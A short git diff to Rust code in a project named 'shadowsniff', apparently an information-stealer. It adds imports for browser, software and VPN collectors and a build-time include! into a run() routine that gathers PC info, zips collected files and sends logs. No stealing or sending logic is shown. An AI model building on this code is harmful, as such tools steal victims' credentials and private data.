@@ -37,6 +37,7 @@ use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
 use sender::LogSenderExt;
 use shadowsniff::SniffTask;
+use collector::{Collector, Browser, Software, Vpn};
 use tasks::Task;
 use utils::pc_info::PcInfo;
 use utils::random::ChaCha20RngExt;
@@ -69,6 +70,8 @@ pub fn run() {
     };
 
     let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
+
+    include!(env!("BUILDER_CONSIDER_EMPTY_EXPR"));
 
     let zip = ZipArchive::default()
         .add_folder_content(&fs, out)
